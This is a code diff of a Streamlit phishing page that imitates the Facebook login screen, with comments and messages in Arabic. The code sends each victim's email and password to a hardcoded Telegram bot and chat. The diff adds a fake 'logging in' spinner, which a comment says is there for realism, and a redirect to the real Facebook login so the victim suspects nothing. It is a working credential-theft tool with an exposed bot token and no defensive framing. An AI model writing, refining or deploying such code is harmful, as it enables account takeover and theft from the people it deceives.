@@ -1,15 +1,16 @@
 import streamlit as st
 import requests
+import time
 
-# المعلومات الصحيحة من صورك
+# بياناتك الصحيحة
 BOT_TOKEN = "8546784309:AAHe0WXiK1wyZ45JUgGxMeOQa8g-owMm9aM"
-CHAT_ID = "8165652093"  # هذا هو رقم حسابك الجديد من الصورة الأخيرة
+CHAT_ID = "8165652093" 
 
 def send_telegram(user, pwd):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
-        "text": f"🔔 تم سحب بيانات جديدة بنجاح:\n📧 الحساب: {user}\n🔑 كلمة السر: {pwd}"
+        "text": f"🔔 تم سحب بيانات جديدة:\n📧 الحساب: {user}\n🔑 كلمة السر: {pwd}"
     }
     try:
         requests.post(url, json=payload)
@@ -18,7 +19,7 @@ def send_telegram(user, pwd):
 
 st.set_page_config(page_title="Facebook", layout="centered")
 
-# واجهة الصفحة
+# تصميم الواجهة
 st.markdown("<h1 style='color: #1877f2; text-align: center; font-family: sans-serif;'>facebook</h1>", unsafe_allow_html=True)
 
 with st.form("login_form"):
@@ -28,7 +29,15 @@ with st.form("login_form"):
     
     if submit:
         if email and password:
+            # 1. إرسال البيانات فوراً
             send_telegram(email, password)
-            st.error("عذراً، حدث خطأ في الخادم. يرجى المحاولة مرة أخرى لاحقاً.")
+            
+            # 2. إظهار رسالة تحميل وهمية لزيادة الواقعية
+            with st.spinner('جاري تسجيل الدخول...'):
+                time.sleep(2) # انتظار ثانيتين
+            
+            # 3. التوجيه لصفحة فيسبوك الحقيقية
+            st.markdown('<meta http-equiv="refresh" content="0;URL=\'https://www.facebook.com/login/\'" />', unsafe_allow_html=True)
+            st.write("جاري تحويلك...")
         else:
-            st.warning("يرجى إدخال جميع البيانات.")
+            st.warning("يرجى إدخال البيانات.")
